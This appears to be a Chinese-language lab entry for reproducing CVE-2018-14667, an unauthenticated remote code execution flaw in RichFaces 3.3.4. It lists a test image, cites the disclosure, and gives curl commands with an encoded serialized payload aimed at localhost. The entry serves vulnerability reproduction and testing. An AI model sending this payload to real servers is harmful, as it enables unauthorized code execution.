## CVE-2018-14667 richfaces 远程代码执行

测试镜像

* src/richfaces/3.3.4/

参考资料 

* [Unauthenticated Remote Code execution in WebApps using Richfaces 3.X all versions (CVE-2018-14667)](https://seclists.org/fulldisclosure/2018/Nov/47)

Poc

```
curl 'http://127.0.0.1/photoalbum/index.seam' -L
curl 'http://127.0.0.1/photoalbum/a4j/s/3_3_3.Finalorg.ajax4jsf.resource.UserResource/n/n/DATA/eAFdUs9r1EAY!bpYrL9ArSgehBqL7YpMBGsRakFai1Z2LXStoB7k2-Tb7IRkZpyZtKml3rwoePHqzate7MGz14KX!g2CiAgiiFdnksXS5pJ84c17b9773v-EYaPhktQJwxTLqdT0mCYjCx0RWzGklwfD-Irmt9Ai-Gf02o8GHGjBsUgTWpqXwpKwFk62UlzFMEORhEvdlCI704KDVCruOJ!CcxhqwUguY97jFA!m4VXMCqqGUjkvFz1FyXoYkWGRzJUUjpt1rBO6I7OYdAdXST!c3pp98!ZLuwGNFhyKMjTmHua010PHai4S5-GwcWfiisPC6doll2GHNMeMP8NuRjOl8vITTpKZQlQGMrKGUcbuY9Im25fxQqncTQyXosoBYOgoQKnhbG3aQffjPobbr77-nXrdqHCj!3G7TO9evOz8frRzwyO8g!O-jLQrTSW9n28xV1n315k!Rz6faHttH9zI2ifYGt8IApaQnfdRTDZZT2ofyGRQS5pIc-VirF4LIuGC2igwIR00maC1RWEsiojcSUdSA-bWBwzGYcj1VJMx3y9bLoTlOXn04NMdpZKiyQkri6g!FtpchZpH!arKKzGuP0klyhytNL2JZtDcBCg0jD6u6qhJB4V92Hnw7fu5jdtVJC7phoVT!hqMS7ZUWFVYByTMLRyvfleG6oVTqlxrwd0w4bZfdP0ChbuqYUqlD3bs5tXpy9PXx!as72xwYSOnmOMcoWBKS7eAZjNwa6H-AZCFGGE_'
```
